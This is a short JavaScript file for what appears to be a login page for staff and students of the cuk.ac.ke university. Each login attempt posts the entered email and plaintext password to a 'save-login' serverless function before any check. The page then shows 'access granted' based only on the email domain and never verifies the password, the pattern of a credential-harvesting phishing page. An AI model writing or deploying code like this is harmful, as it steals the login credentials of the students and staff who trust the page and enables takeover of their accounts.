async function saveSubmission(role, email, password) {
  try {
    await fetch('/.netlify/functions/save-login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ role, email, password })
    });
  } catch (err) {
    console.error('Could not save submission:', err);
  }
}

function checkStaffLogin() {
  const email = document.getElementById('staffEmail').value.trim().toLowerCase();
  const password = document.getElementById('staffPassword').value;
  const msg = document.getElementById('staffMessage');

  saveSubmission('staff', email, password);

  if (email.endsWith('@cuk.ac.ke') && !email.endsWith('@student.cuk.ac.ke')) {
    msg.style.color = '#2f9e44';
    msg.textContent = `Welcome, ${email}. Access granted.`;
  } else {
    msg.style.color = '#e03131';
    msg.textContent = 'Access denied: this app is restricted to @cuk.ac.ke staff accounts.';
  }
}

function checkStudentLogin() {
  const email = document.getElementById('studentEmail').value.trim().toLowerCase();
  const password = document.getElementById('studentPassword').value;
  const msg = document.getElementById('studentMessage');

  saveSubmission('student', email, password);

  if (email.endsWith('@student.cuk.ac.ke')) {
    msg.style.color = '#2f9e44';
    msg.textContent = `Welcome, ${email}. Access granted.`;
  } else {
    msg.style.color = '#e03131';
    msg.textContent = 'Access denied: this app is restricted to @student.cuk.ac.ke accounts.';
  }
}
